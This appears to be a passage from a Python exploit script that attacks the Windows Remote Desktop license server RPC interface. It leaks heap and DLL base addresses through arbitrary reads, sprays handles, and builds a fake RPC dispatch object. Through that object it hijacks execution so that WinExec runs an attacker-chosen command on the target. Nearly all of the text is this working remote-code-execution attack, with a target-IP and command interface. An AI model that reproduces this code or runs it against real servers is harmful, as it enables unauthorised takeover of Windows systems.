        heap_base = arb_read(heap_offset_list, leakHeapBaseOffset=0x188,size = 24)
        print("[+] Leak heap_base: 0x{:x}".format(heap_base))
        
    RtlpHpHeapGlobals_offset = ntdll_base + 0x1CAF00
    RtlpHpHeapGlobals = arb_read(RtlpHpHeapGlobals_offset, padding=True) >> 16
    print("[+] Leak RtlpHpHeapGlobals: 0x{:x},data size:0x{:x}".format(RtlpHpHeapGlobals,blockSize))
    
    vsList_offset = heap_base + 0x2c0 + 0x10

    suitableList = 0
    while True:
        print("[+] arb_read: 0x{:x}".format(vsList_offset))
        vsList_ptr = arb_read(vsList_offset, padding=True)
        print("[+] Leak vsList_ptr: 0x{:x}".format(vsList_ptr))
        if (vsList_ptr & 0xffffffffffff) == 0:
            break
            
        list_head_mask = arb_read(vsList_ptr - 8, padding=True)
        #122fc0
        
        vsSize = (list_head_mask&0xffffffff) ^ ((vsList_ptr - 8) & 0xffffffff) ^ (RtlpHpHeapGlobals&0xffffffff)
        print("[+] Leak list_head_mask: 0x{:x},vsSize:0x{:x}".format(list_head_mask,vsSize))
        if vsSize > blockSize:
            suitableList = vsList_ptr
            vsList_offset = vsList_ptr
        else:
            vsList_offset = vsList_offset+8
        
    if (suitableList & 0xffffffffffff) == 0:
        return 0
    return suitableList + 8
    
    

def GetBackendAddr(backend_size):   
    global dce,ntdll_base,heap_base
    
    pageSize = (backend_size + 4095) >> 12
    blockSize = (pageSize - 1 + (1<<4)) >> 4
    blockSize = blockSize << 24
    print("block size:0x{:x}".format(blockSize))
    
    if heap_base == 0:
        heap_offset_list = [0x100008, 0x100008, 0x400000, 0x600000, 0x800000, 0xb00000, 0xd00000, 0xf00000]
        heap_base = arb_read(heap_offset_list, leakHeapBaseOffset=0x188,size = 24)
        print("[+] Leak heap_base: 0x{:x}".format(heap_base))
    
    #if the 0x150 offset value(0x7f000) of the heapbase is smaller than blockSize,then the value is 0x200 
    param_offset = 0
    if backend_size > 0x7f000:
        param_offset = 0x200
    else:
        param_offset = 0x140
        
        
    #payload = b'0'*0x100000
    #reg_lic_keypack = construct_TLSRpcRegisterLicenseKeyPack(payload)
    #dce.request(reg_lic_keypack)
    
    address_mask = 0xffffffffff000000
    
    #address_bit = arb_read(heap_base + param_offset + 8, padding=True) & 0xff
    address_bit = 0x10
    print("[+] Leak address_bit: 0x{:x}".format(address_bit))
    
    suitableAddr = 0
    
    backend_offset = heap_base + param_offset + 0x60
    
    backend_ptr = arb_read(backend_offset, padding=True)
    
    print("[+] Leak backend_offset: 0x{:x},backend_ptr: 0x{:x}".format(backend_offset,backend_ptr))
    
    if (backend_ptr & 0xffffffffffff) != 0:
        while True:
     
            backend_size = arb_read(backend_ptr + 28, padding=True) & 0xffffffff
            
            print("[+] Leak backend_offset: 0x{:x},backend_ptr: 0x{:x}".format(backend_ptr+28,backend_size))
            
            if backend_size < blockSize:
                backend_offset = backend_ptr+8
            else:
                suitableAddr = backend_ptr
                backend_offset = backend_ptr
                
                      
            backend_ptr = arb_read(backend_offset, padding=True)
            
            if (backend_ptr - heap_base >= 0x10000000) or (backend_ptr <=heap_base) :
                break;
            if (backend_ptr & 0xffffffffffff) == 0:
                break
           
    print("[+] LAST Leak backend_offset: 0x{:x},backend_ptr: 0x{:x}".format(backend_offset,backend_ptr))        
        
    if (suitableAddr & 0xffffffffffff) == 0:
        print("[+] GetBackendAddr error!suitableAddr is NULL!")
        return 0
        
    mask_addr = suitableAddr & address_mask
    address = mask_addr + (((suitableAddr - mask_addr) >> 5) << address_bit)
    print("[+] suitableAddr: 0x{:x},Leak backend: 0x{:x}".format(suitableAddr,address))
    return address


def leak_addr():
    print("[+] 尝试使其泄露基地址")
    global heap_base, ntdll_base, peb_base, pe_base, rpcrt4_base, kernelbase_base,kernel32_base
    global leak_idx
      
    #heap_offset_list = [0x100008, 0x100008, 0x400000, 0x600000, 0x800000, 0xb00000, 0xd00000, 0xf00000]
    heap_offset_list = [0x100008]
    heap_base = arb_read(heap_offset_list, leakHeapBaseOffset=0x188,size = 24)
    print("[+] Leak heap_base: 0x{:x}".format(heap_base))
    
    '''
    #ntdll_base = arb_read(heap_base + 0x102048, padding=False) - 0x1bd2a8
    ntdll_offset_list = [heap_base + 0x102048]
    ntdll_base = arb_read(ntdll_offset_list, padding=True,leakHeapBaseOffset=0x1CB2A8)
    if ntdll_base == None or ntdll_base == 0:
        print("[+] Leak ntdll_base: null")
        exit(0)
    else:
        print("[+] Leak ntdll_base: 0x{:x}".format(ntdll_base))
    '''
    
    #tls_bit_map_addr = ntdll_base + 0x1bd268
    #1CF6D0
    #x ntdll!*LdrpTlsBitmap*
    #x ntdll!*TlsBitMap*
    #print("[+] Leak tls_bit_map_addr: 0x{:x}".format(tls_bit_map_addr))
    #peb_base = arb_read(tls_bit_map_addr, padding=True) - 0x80
    
    #peb_base_offset_list = [heap_base + 0x11D9B8]
    #peb_base = arb_read(peb_base_offset_list, padding=True,leakHeapBaseOffset=0x7298)
    
    '''
    peb_base_offset_list = [ntdll_base + 0x1CB268]
    peb_base = arb_read(peb_base_offset_list, padding=True,leakHeapBaseOffset=0x80)
    if peb_base == None or peb_base == 0:
        print("[+] Leak peb_base: null")
        exit(0)
    else:
        print("[+] Leak peb_base: 0x{:x}".format(peb_base))
    
    pe_base = arb_read(peb_base + 0x12, padding=True, passZero=True) << 16
    if pe_base == 0:
        print("[+] Leak pe_base: null")
        exit(0)
    else:
        print("[+] Leak pe_base: 0x{:x}".format(pe_base))
    
    pe_import_table_addr = pe_base + 0x10000
    print("[+] Leak pe_import_table_addr: 0x{:x}".format(pe_import_table_addr))
    
    rpcrt4_base = arb_read(pe_import_table_addr, padding=True,leakHeapBaseOffset=0xa4d70) - 0
    if rpcrt4_base == 0:
        print("[+] Leak rpcrt4_base: null")
        exit(0)
    else:
        print("[+] Leak rpcrt4_base: 0x{:x}".format(rpcrt4_base))
    
    rpcrt4_import_table_addr = rpcrt4_base + 0xe7bf0
    print("[+] Leak rpcrt4_import_table_addr: 0x{:x}".format(rpcrt4_import_table_addr))
    
    kernelbase_base = arb_read(rpcrt4_import_table_addr, padding=True,leakHeapBaseOffset=0x10aec0) - 0
    if kernelbase_base == 0:
        print("[+] Leak kernelbase_base: null")
        exit(0)
    else:  
        print("[+] Leak kernelbase_base: 0x{:x}".format(kernelbase_base))
    '''

    #heap_offset_list = [0x178,0x238]
    #heap_base = arb_read(heap_offset_list, size = 24)
    #print("[+] Leak heap_base: 0x{:x}".format(heap_base))
    
    ntdll_base = arb_read(heap_base+0x105430+2, padding=True,passZero=True) << 16
    #ntdll_base = arb_read(heap_base+0x1054f8+2, padding=True,passZero=True) << 16
    if ntdll_base == 0:
        print("[+] Leak ntdll_base: null")
        exit(0)
    elif (ntdll_base & 0x7ff000000000) == 0x7ff000000000:
        print("[+] Leak ntdll_base: 0x{:x}".format(ntdll_base)) 
    else:  
        print("[+] Leak ntdll_base error:0x{:x}".format(ntdll_base))
        exit(0)
    
    #rpcrt4_base = arb_read(heap_base+0x10d2d0+2, padding=True,passZero=True) << 16
    #rpcrt4_base = arb_read(heap_base+0x10ce90+2, padding=True,passZero=True) << 16
    #rpcrt4_base = arb_read(heap_base+0x10cf58+2, padding=True,passZero=True) << 16
    #rpcrt4_base = arb_read(heap_base+0x12e948+2, padding=True,passZero=True) << 16
    rpcrt4_base = arb_read(ntdll_base+0x1e3a08+2, padding=True,passZero=True) << 16
    if rpcrt4_base == 0:
        print("[+] Leak rpcrt4_base: null")
        exit(0)
    elif (rpcrt4_base & 0x7ff000000000) == 0x7ff000000000:
        print("[+] Leak rpcrt4_base: 0x{:x}".format(rpcrt4_base))
    else:
        print("[+] Leak rpcrt4_base error:0x{:x}".format(rpcrt4_base))
        exit(0)
            
    kernel32_base = arb_read(heap_base+0x105b10+2, padding=True,passZero=True) << 16
    #kernel32_base = arb_read(heap_base+0x105bd8+2, padding=True,passZero=True) << 16    
    #kernel32_base = arb_read(heap_base+0x150f48+2, padding=True,passZero=True) << 16
    #kernel32_base = arb_read(heap_base+0x105bd8+2, padding=True,passZero=True) << 16    
    #kernel32_base = arb_read(heap_base+0x54abc6+2, padding=True,passZero=True) << 16
    #kernel32_base = arb_read(heap_base+0x54ac06+2, padding=True,passZero=True) << 16
    #kernel32_base = arb_read(ntdll_base+0x1e3978+2, padding=True,passZero=True) << 16
    if kernel32_base == 0:
        print("[+] Leak kernel32_base: null")
        exit(0)
    elif (kernel32_base & 0x7ff000000000) == 0x7ff000000000:
        print("[+] Leak kernel32_base: 0x{:x}".format(kernel32_base))
    else:
        print("[+] Leak kernel32_base error:0x{:x}".format(kernel32_base))
        exit(0)
    
    return heap_base


def hijack_rip_and_rcx(heap_base, rpcrt4_base, kernelbase_base, cmd):
    global handle_lists, dce,ntdll_base
    
    global g_heap_offset_predication
    
    print("[*] Hijack rip and rcx")
    print("[*] rip: kernelbase!LoadLibraryA")
    print("[*] rcx: {0}".format(cmd))
    
    backend_ptr = 0
    while True:
        backend_size = 0x100000
        payload = b'A'*backend_size
        reg_lic_keypack = construct_TLSRpcRegisterLicenseKeyPack(payload)
        dce.request(reg_lic_keypack)
        print("waiting GetBackendAddr 0x{:x}".format(backend_size))

        backend_offset = heap_base + 0x200 + 0x60
        backend_ptr = arb_read(backend_offset, padding=True)
        if (backend_ptr & 0xffffffffffff) != 0:
            address_mask = 0xffffffffff000000
            mask_addr = backend_ptr & address_mask
            #address_bit = 0x10
            #address = mask_addr + (((backend_ptr - mask_addr) >> 5) << address_bit)
            address = mask_addr + 0x560000
            g_heap_offset_predication = address - heap_base
            print("backend_ptr:0x{:x},GetBackendAddr next 0x{:x}".format(backend_ptr,address))
            break
        else:
            pass
    
    while True:
        #spray_lfh_chunk(0x20, 0x800)            #why?for what?
        
        spray_handles(0xc00)
        handles_free()

        #g_heap_offset_predication = 0x8450000
 
        loop_time = 1
        edge_delta = 0
        if loop_time > 1:
        #8450000
            edge_delta = 0x100000*(loop_time+0) 
        else:
            edge_delta = 0
        
        for _ in range(loop_time):
            payload = construct_fake_obj(heap_base,ntdll_base, rpcrt4_base, kernelbase_base, cmd,heap_offset =g_heap_offset_predication+edge_delta)

            reg_lic_keypack = construct_TLSRpcRegisterLicenseKeyPack(payload)

            #g_heap_offset_predication += 0x100000

            dce.request(reg_lic_keypack)


        pdb.set_trace() 
        #spray_fake_obj(reg_lic_keypack) 
        
        fake_obj_addr = heap_base + g_heap_offset_predication+edge_delta
        tls_register_LKP = construct_overflow_fake_obj_buf(fake_obj_addr)
        print("[+] Calculate fake_obj_addr: 0x{:x}".format(fake_obj_addr))         
        try:
            dce.request(tls_register_LKP)
        except Exception as e:
            frame = sys._getframe(0)
            func_name = frame.f_code.co_name
            line_no = frame.f_lineno
            print(f"{func_name} line:{line_no} exception:{str(e)}!")
            pass
        
           
        
        print("[*] Try to connect to server...")
        
        for handle in handle_lists[::-1]:
            #print("[*] construct_TLSRpcKeyPackEnumNext...")
            rpc_key_pack_enum_next = construct_TLSRpcKeyPackEnumNext(handle)
            try:
                dce.request(rpc_key_pack_enum_next)
            except Exception as e:
                frame = sys._getframe(0)  
                func_name = frame.f_code.co_name
                line_no = frame.f_lineno
                #print(f"{func_name} line:{line_no} exception:{str(e)}!")
                
            #disconnect(handle)
            #handle_lists.remove(handle)
            
        remove_handles()
        
        print("[*] Check whether the exploit successed? (Y/N)\t")
        status = input("[*] ")
        if status == "Y" or status == "y":
            print("[+] Exploit success!")
            exit(0)


def bytes_to_hex(bytes_data, add_prefix=False, uppercase=False):
    """
    将 bytes 类型转换为十六进制字符串
    
    参数:
        bytes_data: 待转换的 bytes 类型数据（必填）
        add_prefix: 是否在结果前添加 '0x' 前缀（默认 False）
        uppercase: 是否将十六进制字符转为大写（默认 False，即小写）
    
    返回:
        str: 转换后的十六进制字符串
    
    异常:
        TypeError: 输入不是 bytes 类型时抛出
    """
    # 校验输入类型（必须是 bytes）
    if not isinstance(bytes_data, bytes):
        raise TypeError("输入必须是 bytes 类型")
    
    # 调用 bytes 的 hex() 方法转换为小写十六进制字符串（无前缀）
    hex_str = bytes_data.hex()
    
    # 若需要大写，转换为 uppercase
    if uppercase:
        hex_str = hex_str.upper()
    
    # 若需要添加前缀，在前面加 '0x'
    if add_prefix:
        hex_str = f"0x{hex_str}"
    
    return hex_str



def construct_fake_obj(heap_base,ntdll_base, rpcrt4_base, kernelbase_base, cmd, NdrServerCall2_offset=0x16f50,OSF_SCALL_offset=0xdff10, LoadLibraryA_offset=0xf6de0,heap_offset=0):
    
    first_ptr =  0x2000
    second_ptr = 0x2400
    DispatchTable_ptr = 0x2800
    DispatchToStub_ptr = 0x2c00
    
    DispatchToData_ptr = 0x3000
    
    BufferLength = 0x100
    Buffer_ptr = 0x3400
    ManagerEpv_ptr = 0x3800
    dummy_func_ptr = 0x3c00
    rpc_params_ptr = 0x4000
    

    payload = b""
    payload += p64(heap_base+ heap_offset + first_ptr)
    payload += b"a" * (0x1474 - 8 )
    payload += b"\x01"
    payload += b'b' * (first_ptr - 0x1475 )
    
    #first_ptr
    #struct RPC_MESSAGE,80 bytes
    payload += p64(heap_base + heap_offset + second_ptr)    #RPC_BINDING_HANDLE      
    payload += p32(0x10)       #DataRepresentation
    payload += p32(0)       #aligned 8 bytes ,padding for Buffer
    payload += p64(heap_base + heap_offset + Buffer_ptr)       #Buffer
    payload += p32(BufferLength)       #BufferLength
    payload += p32(0)       #ProcNum     
    payload += p64(0)       #PRPC_SYNTAX_IDENTIFIER 
    payload += p64(heap_base + heap_offset + DispatchTable_ptr)       #RpcInterfaceInformation offset=0x28
    payload += p64(0)       #ReservedForRuntime
    payload += p64(heap_base+ heap_offset + ManagerEpv_ptr)       #ManagerEpv offset = 0x38
    payload += p64(0)       #ImportContext
    payload += p32(0x1000)       #RpcFlags
    payload += p32(0)       #aligned 8 bytes ,padding for struct end
     
    payload += b'c'*(second_ptr - first_ptr - 80)   #between first_ptr and second_ptr
    
    #second_ptr
    payload += p64(heap_base+ heap_offset +dummy_func_ptr)   #NdrpServerUnMarshal will call the function pointer,set it ThreadSelf
    payload += p32(0x89abcdef)      #rpcmsg->handle magic
    payload += p32(0x33307C)      #rpcmsg->handle magic
    payload += b'c'* (0x70 - 16)
    payload += p64( rpcrt4_base + NdrServerCall2_offset)
    
    payload += b'c'*(0x1e8 - 0x70 - 8)
    payload += p64(rpcrt4_base + NdrServerCall2_offset)     #0x1e8
    payload += p64(rpcrt4_base + NdrServerCall2_offset)     #0x1f0
    payload += b'd'*(DispatchTable_ptr - second_ptr - 0x1f8)
    
    #DispatchTable_ptr
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)            #index to v8
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
    payload += p64(heap_base + heap_offset + DispatchToStub_ptr)
     
    payload += b'd'*(DispatchToStub_ptr - DispatchTable_ptr - 128) 

    #DispatchToStub_ptr ,v8
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #0
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #8
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #16      v8[2]
    payload += p64(heap_base + heap_offset + DispatchToData_ptr+128-8)       #24      v8[3]
    payload += p64(0)       #32 must be 0 else call v51(&Message) but not Invoke()
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #40
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #48
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #56
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #64
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #72
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #80
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #88
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #96
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #104 
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #112
    payload += p64(heap_base + heap_offset + DispatchToData_ptr)       #120

    
    payload += b'f'*(DispatchToData_ptr - DispatchToStub_ptr - 128) 
    
    #_MIDL_STUB_DESC
    #DispatchToData_ptr, #v10 = (_MIDL_STUB_DESC *)(v8[2] + *(unsigned __int16 *)(v8[3] + 2 * ProcNum_low));
    payload += b'\x68'          #call this or ManagerEpv_ptr?
    payload += b'\x00'
    payload += b'\x00'
    payload += b'\x00'
    payload += p16(2*8)      #params counter?
    payload += b'\x00'
    payload += b'\x00'
    payload += b'\x00'       
    payload += b'\x00'
    payload += b'\x00'
    payload += b'\x02'     #param counter
    
    #payload += p64(heap_base + heap_offset + rpc_params_ptr)              #pointer to buffer
    payload += p16(0x48)        
    payload += p16(0)           ##dst offset
    payload += p16(0x0C)        #alignment 8 and size 8
    
    payload += p16(0x48)
    payload += p16(8)
    payload += p16(0x0C)
    
    payload += p16(0x48)
    payload += p16(0)
    payload += p16(0x0C)
    
    payload += p16(0x148)
    payload += p16(0)
    payload += p16(0x0C)
    
    payload += p16(0x148)
    payload += p16(0)
    payload += p16(0x0C)
    
    payload += p16(0x148)
    payload += p16(0)
    payload += p16(0x0C)

    payload += p64(0) 
    payload += p64(0) 
    payload += p64(0) 
    payload += p64(0) 
    payload += p64(0)   
    payload += p64(0)
    payload += p64(0) 
    payload += p64(0) 
    payload += p64(0) 
    payload += p64(0) #must be 0
  
    payload += b'f'*(Buffer_ptr - DispatchToData_ptr - 128) 
     
    #Buffer_ptr
    payload += p64(heap_base + heap_offset + Buffer_ptr + 256)
    
    payload += p64(5)
    
    payload += p64(0)*30
    
    payload += cmd
    payload += b'g'*(256 - len(cmd))
    #payload += b'calc.exe\x00\x00\x00\x00'
    #payload += b'g'*(256 - len(b'calc.exe\x00\x00\x00\x00'))
    
    payload += b'h'* 256    #no seperator between + and =
    
    payload += b'i'* 256    #no seperator between b and 'h'

    #payload += b'h'*(ManagerEpv_ptr - Buffer_ptr ) 
    
    #ManagerEpv_ptr
    payload += p64(kernel32_base+0x701f0)     #WinExec
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
    payload += p64(kernel32_base+0x701f0)
     
    payload += b'i'*(dummy_func_ptr - ManagerEpv_ptr - 128) 
    
    payload += p64(0) * 32
    
    #payload += p64(rpcrt4_base+0x853F0) #SleepTime
    payload += p64(rpcrt4_base+0xB1870)     #I_RpcTurnOnEEInfoPropagation
    
    payload += b'j'*(rpc_params_ptr - dummy_func_ptr - 256 - 8)
    
    #rpc_params_ptr
    payload += p64(0) * 32
    
    payload += b'i'*(0x100000 - rpc_params_ptr - 256)
    
    return payload





    



def hex_to_bytes(hex_input):
    """
    将十六进制输入转换为bytes类型
    
    参数:
        hex_input: 可以是整数（如0x1234）、带0x前缀的字符串（如"0x1234"）或纯十六进制字符串（如"1234"）
    
    返回:
        bytes: 转换后的字节序列
    
    异常:
        TypeError: 输入类型不是整数或字符串
        ValueError: 输入包含无效的十六进制字符
    """
    # 1. 处理输入，转换为不带0x前缀的纯十六进制字符串
    if isinstance(hex_input, int):
        # 整数转十六进制字符串（去掉0x前缀）
        hex_str = hex(hex_input)[2:]  # hex(0x123) → '0x123' → [2:]取'123'
    elif isinstance(hex_input, str):
        # 字符串去掉0x/0X前缀（忽略大小写）
        hex_str = hex_input.lstrip('0x').lstrip('0X')
    else:
        raise TypeError("输入必须是整数或字符串")
    
    # 2. 处理空字符串（如输入0x0时，hex_str会为空）
    if not hex_str:
        hex_str = '0'
    
    # 3. 若长度为奇数，补前导0（保证每2个字符对应1个字节）
    if len(hex_str) % 2 != 0:
        hex_str = '0' + hex_str
    
    # 4. 转换为bytes并返回（捕获无效字符错误）
    try:
        return bytes.fromhex(hex_str)
    except ValueError as e:
        raise ValueError(f"无效的十六进制输入：{hex_input}（错误：{e}）")



def pwn(target_ip, server_ip, cmd, check_vuln_exist):
    global dce, rpctransport, handle_lists, leak_idx, heap_base, rpcrt4_base, kernelbase_base, pe_base, peb_base,kernel32_base

    cmd = b'cmd /c ' + cmd.encode('utf-8') + b'\x00\x00\x00\x00'
    print("cmd:{},len:0x{:x}".format(cmd,len(cmd)) )
    print("-" * 0x50)
    print(DESCRIPTION)
    print("\tTarget_ip: {0}\n\tServer_ip: {1}\n\tcommand: {2}\n\tcheck_vuln_exist: {3}".format(target_ip, server_ip,cmd,check_vuln_exist))
    
    print("-" * 0x50)
    print("[*] Run exploit script for 1 times")
    
    try:
        print("[+] Connecting...")
        connect_to_license_server(target_ip)
        
        '''
        #GetVsAllocAddr(0x1000)
        backend_size = 0x100000
        payload = b'A'*backend_size
        reg_lic_keypack = construct_TLSRpcRegisterLicenseKeyPack(payload)
        dce.request(reg_lic_keypack)
        print("waiting GetBackendAddr 0x{:x}".format(backend_size))
        #pdb.set_trace()
        #dce.request(reg_lic_keypack)
        #pdb.set_trace()
        address = GetBackendAddr(backend_size)
        address = address + 0x560000
        g_heap_offset_predication = address
        
        #pdb.set_trace()
        print("GetBackendAddr next 0x{:x}".format(backend_size))
        '''
        
        print("[+] Connected Succesful!")
        print("[+] Try get base address...")
        heap_base=leak_addr()
        
        if heap_base is not None:
            print("[+] Target exists vulnerability, try exploit...")
        else:
            print("[-] Failed to check for vulnerability.")
            exit(0)
        
        print("[+] 尝试劫持rip&rcx")
        hijack_rip_and_rcx(heap_base,rpcrt4_base , kernelbase_base, cmd)

        print("[-] 断开连接...")
        dce.disconnect()
        rpctransport.disconnect()
    except (ConnectionResetError, DCERPCException) as e:
        print(f"Error:{e}")
        



def MyTestFunc():
    pass
    


if __name__ == '__main__':
    
    parse = argparse.ArgumentParser(description=DESCRIPTION)
    parse.add_argument("--target_ip", type=str, required=True, help="Target IP, eg: 192.168.1.2")
    parse.add_argument("--server_ip", type=str, required=True, help="Server IP, eg: 192.168.1.1")
    #parse.add_argument("--evil_dll_path", type=str, required=False, default="\\smb\\evil_dll.dll",help="Evil dll path, eg: \\smb\\evil_dll.dll")
    #parse.add_argument("--evil_dll_path", type=str, required=False, default="test.dll",help="Evil dll path, eg: test.dll")
    parse.add_argument("--check_vuln_exist", type=bool, required=False, default=False,help="Check vulnerability exist before exploit")
    parse.add_argument("--command", type=str, required=False, default="cmd /c calc.exe",help="command to execute, eg: calc.exe")
    args = parse.parse_args()
    #pwn(args.target_ip, args.evil_ip, args.evil_dll_path, args.check_vuln_exist)
    pwn(args.target_ip, args.server_ip,args.command, args.check_vuln_exist)



'''
1. padding in construct_overflow_arbread_buf
2. remove_handles()
'''